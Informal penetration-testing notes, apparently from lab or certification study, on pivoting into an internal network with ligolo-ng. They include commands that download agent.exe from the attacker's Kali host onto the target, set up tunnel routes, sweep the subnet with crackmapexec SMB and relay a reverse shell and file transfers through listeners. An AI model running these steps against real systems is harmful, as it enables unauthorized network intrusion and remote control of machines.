Setup ligolo in kali and transfer the agent.exe to target:
#powerful tool, acts like a VPN to connect to the internal network

>sudo ip tuntap add user kali mode tun ligolo
>sudo ip link set ligolo up

Setup the Python web server for hostinbg the file transfer to target:
>python server trigger

In target:
iwr -uri http://$Kali IP/agent.exe -Outfile agent.exe

Confirm the existence of the files:
>dir
>./agent -connect $KaliIP:11601 -ignore-cert 
>session - can see the session # for this (e.g. 1)

Then, we need to add the target IP adr into our Routing table in ligolo bcozwe want to access the internal 172.16.116.0/24 network, so we need to open a new terminal and add the corresponding route to our ligolo-ng interface with the following command :
>sudo ip route add 172.16.116.0/24 dev ligolo

To confirm our ip routing is added,
>ip route list

All set, now start the logo, back to ligolo session in kali,
>start

use smb to test login attempt:
>crackmapexec smb 172.16.116.0/24

Reverse shell:
Add listeners to the ligolo session and connect back to our local host listening on port 4444 (for example)
>listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
(0.0.0.0 means for all interfaces)

To confirm, 
>listener_list

Transferring files:
Once weâ€™ve got the reverse shell, we need to upload our winps, lin ps, privest check or seatbelt, etc.
add another listener at another port, bcoz the previous one is for setting up the tunnel.
>listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000 #1234 was used in the last port for reverse shell connection
